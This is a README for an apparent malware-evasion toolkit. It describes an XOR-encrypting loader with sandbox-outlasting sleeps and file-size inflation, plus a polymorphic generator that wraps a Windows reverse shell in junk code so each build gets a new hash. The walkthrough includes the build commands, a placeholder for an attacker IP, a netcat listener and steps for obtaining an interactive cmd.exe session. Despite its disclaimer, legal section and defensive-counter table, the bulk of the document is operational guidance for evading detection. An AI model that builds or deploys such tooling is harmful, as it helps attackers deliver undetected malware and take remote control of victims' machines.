# Hidden-Bytes

> **Disclaimer — Educational Use Only**
> This repository is for academic study and defensive security research only. All code must be executed inside **isolated, authorized lab environments** with no external network access. Unauthorized use is illegal.

---

## Table of Contents

1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Evasion Program Explanation](#evasion-program-explanation)
4. [Polymorphic Program Explanation](#polymorphic-program-explanation)
5. [Walkthroughs](#walkthroughs)
6. [Technical Insights](#technical-insights)
7. [Ethical and Legal Report](#ethical-and-legal-report)

---

## Overview

Hidden-Bytes demonstrates two defensive-research concepts through proof-of-concept scripts:

- **`evasion_builder.py`** — XOR-encrypts a compiled binary, embeds it in a compiled C loader with an execution delay, and optionally inflates file size with null-byte padding to change static indicators (hash, size).
- **`polymorph_gen.py`** — Generates a unique binary on every build by injecting random junk C++ functions into a reverse-shell source and compiling it. Each output has a different hash while keeping the same core functionality.
- **`payload.cpp`** — Example reverse-shell C++ source produced by the polymorphic generator.
- **`safe_pad.py`** — Appends 101 MB of null bytes to a compiled binary to exceed sandbox file-size limits.
- **`simple_program.c`** — Simple "Hello, World!" C program used as the test binary for the evasion builder.

---

## Prerequisites

- **Python 3.8+**
- **Visual Studio 2022** with the "Desktop development with C++" workload (for `polymorph_gen.py`)
- **Isolated VM environment** — Windows target VM + attacker/listener host on a private virtual network, no internet
- **Netcat** or similar listener for reverse-shell testing (`nc -lvnp 4444`)

---

## Evasion Program Explanation

**File:** `evasion_builder.py`

This script transforms a compiled binary so its on-disk representation completely differs from the original, defeating static-analysis indicators like file hashes.

**How it works:**

1. **XOR Encryption** — Reads the target binary and encrypts it with a randomly generated 32-byte XOR key. A unique key is generated per run, so encrypting the same file twice produces entirely different ciphertext.
2. **C Loader Generation** — Generates a C source file that embeds the encrypted payload as a byte array. At runtime the loader:
   - Sleeps for the configured delay (default 101 seconds) to outlast sandbox analysis windows
   - Decrypts the payload in memory using the embedded XOR key
   - Writes the decrypted binary to a temp file, executes it, waits for it to finish, then deletes it
3. **Compilation** — Compiles the loader with the Visual Studio `cl` compiler into a standalone `.exe`.
4. **File-Size Inflation** — Optionally appends N megabytes of null bytes to the compiled output, pushing it past sandbox upload limits (~100 MB).
5. **Result** — A fully working executable that decrypts and runs the original binary at runtime, with a completely different hash and optionally inflated size.

**CLI arguments:**
- `--encrypt <file>` — target binary to encrypt
- `--output <file>` — output filename (default: `obfuscated.exe`)
- `--add-size <MB>` — null-byte padding to append
- `--delay <seconds>` — execution delay value (default: 101 s)

---

## Polymorphic Program Explanation

**File:** `polymorph_gen.py`

This script creates a **unique Windows binary on every run** while the core functionality (a reverse shell) stays identical.

**How it works:**

1. **Junk Code Generation** — Generates five random C++ functions, each with a random 8-character name and random integer constants. These compile into the `.text` section, changing code layout, offsets, and the resulting binary hash.

2. **Source Assembly** — Embeds the junk functions alongside a `main()` that implements a Windows reverse shell:
   - `Sleep(101000)` — 101-second delay to outlast sandbox analysis windows
   - Winsock initialization → TCP socket → connect-back to attacker IP/port
   - `CreateProcessA` spawns `cmd.exe` with stdin/stdout/stderr redirected through the socket

3. **Compilation** — Invokes the VS2022 developer environment and compiles with `cl /O2`, linking `ws2_32.lib`. Output is a standalone PE binary.

**Why it's polymorphic:** Every run produces different function names, different constants, and therefore different machine code and a completely different SHA-256 hash — defeating signature-based detection while keeping behavior identical.

---

## Walkthroughs

> **All steps must be performed in an isolated lab** — VMs with snapshots, no internet, isolated virtual network only.

### Evasion Builder

#### Step 1 — Prepare a Simple Binary

Create a simple program that prints "Hello, World!" — the file `simple_program.c` is included in this repo:

```c
#include <stdio.h>

int main() {
    printf("Hello, World!\n");
    return 0;
}
```

Compile it into `simple_program.exe`:

```bash
cl simple_program.c /Fe:simple_program.exe
```

#### Step 2 — Run the Evasion Program

Encrypt the binary with a 101-second delay and 101 MB size inflation:

```bash
python evasion_builder.py --encrypt simple_program.exe --output evaded_program.exe --add-size 101 --delay 101
```

Expected output:
```
[*] Encrypting simple_program.exe...
[*] Compiling loader...
[*] Inflating file by 101MB...
[+] Success! evaded_program.exe generated.
[+] Final Size: 101.28 MB
```

#### Step 3 — Verify the Result

Compare hashes to confirm the output is completely different from the original:

```powershell
Get-FileHash .\simple_program.exe -Algorithm SHA256
Get-FileHash .\evaded_program.exe -Algorithm SHA256
```

The hashes will differ entirely. Running the evasion builder again on the same input produces yet another different hash because a new random XOR key is generated each time.

### Polymorphic Generator

```bash
# 1. Edit polymorph_gen.py — set your attacker IP and port:
#    generate_cpp_source("YOUR_ATTACKER_IP", YOUR_PORT)

# 2. Generate and compile
python polymorph_gen.py

# 3. (Optional) Inflate with padding
python safe_pad.py
```

**Verify polymorphism** — run twice and compare hashes:
```powershell
python polymorph_gen.py
Get-FileHash .\polymorphic_shell.exe | Select-Object Hash
Copy-Item .\polymorphic_shell.exe .\build1.exe

python polymorph_gen.py
Get-FileHash .\polymorphic_shell.exe | Select-Object Hash
# Hashes will differ
```

**Test the reverse shell (isolated lab only):**

1. **Attacker host:** `nc -lvnp 4444`
2. **Target VM:** `.\polymorphic_shell.exe`
3. Wait 101 seconds for the stealth delay — the attacker terminal receives an interactive `cmd.exe` session.
4. **After testing:** close everything and revert the VM snapshot.

---

## Technical Insights

### Binary Structure (Windows PE)

Windows PE files consist of headers, sections (`.text`, `.data`, `.rdata`), and optional overlay data. The PE loader only maps declared sections — when `safe_pad.py` appends 101 MB of null bytes, it sits in the overlay region, changing the file hash/size on disk without affecting execution.

### Encryption — XOR

| Property | Detail |
|---|---|
| Algorithm | XOR with multi-byte key |
| Key | 32 random bytes (1–255), generated per run |
| Output | Each byte of the original XORed with the corresponding key byte (cycling) |

A fresh random key per run means every encryption produces unique ciphertext. The encrypted payload is embedded directly in the compiled C loader as a byte array, making the resulting binary completely different from the original.

### Stealth Techniques Summary

| Technique | Evasion Effect | Defensive Counter |
|---|---|---|
| **101s Sleep delay** | Outlasts typical 60–90s sandbox windows | Hook `Sleep`/`NtDelayExecution` to fast-forward; flag large sleep calls |
| **101 MB null padding** | Exceeds sandbox upload limits; changes hash/size | Strip trailing nulls; use section-aware analysis |
| **XOR encryption** | Destroys all original byte patterns | Entropy scanning; behavioral analysis |
| **Polymorphic junk code** | Unique hash/layout per build | Behavioral detection; ML classifiers on API call sequences |

### Reverse Shell Flow

```
Target (Windows VM)  ── outbound TCP 4444 ──>  Attacker (Listener)
                     <── cmd.exe I/O ────────
```

API sequence: `WSAStartup → WSASocket → WSAConnect → CreateProcessA(cmd.exe)`

The outbound connection is more likely to pass firewalls that block inbound traffic. The attacker receives an interactive shell with the privileges of the user who ran the binary.

**Secure testing checklist:**
- Isolated virtual network (host-only) — no NAT, no internet
- Static IPs on both machines
- VM snapshot before execution; revert after
- Packet capture to verify no traffic leaks

---

## Ethical and Legal Report

### Ethical Responsibilities

- **Intent matters.** These tools exist to help defenders understand attacker techniques and build better detection — not to cause harm.
- **Minimize risk.** Always use the most restricted environment possible. Never test on production systems or networks belonging to others.
- **Share responsibly.** Focus findings on defense and detection, not offensive playbooks.

### Legal Considerations

| Area | Consideration |
|---|---|
| **Computer Fraud laws** | Unauthorized access is criminal in most jurisdictions (U.S. CFAA, UK CMA, EU Directive 2013/40/EU), even without causing damage. |
| **Authorization** | **Explicit, written permission** from the system owner is required before running any of these tools. |
| **Scope** | Authorization must define which systems, networks, and time windows are in scope. |
| **Data handling** | Any data encountered via reverse shell must comply with data protection regulations (GDPR, CCPA, etc.). |
| **Institutional policies** | Academic use requires documented approval from an ethics board or instructor. |
| **Responsible disclosure** | If vulnerabilities are discovered, follow coordinated disclosure — notify the vendor privately first. |

> These tools are **academic research instruments**. Every use must be authorized, isolated, documented, and legal. The responsibility lies with the operator.

---

*All code in this repository is provided for educational purposes only. The authors assume no liability for misuse.*
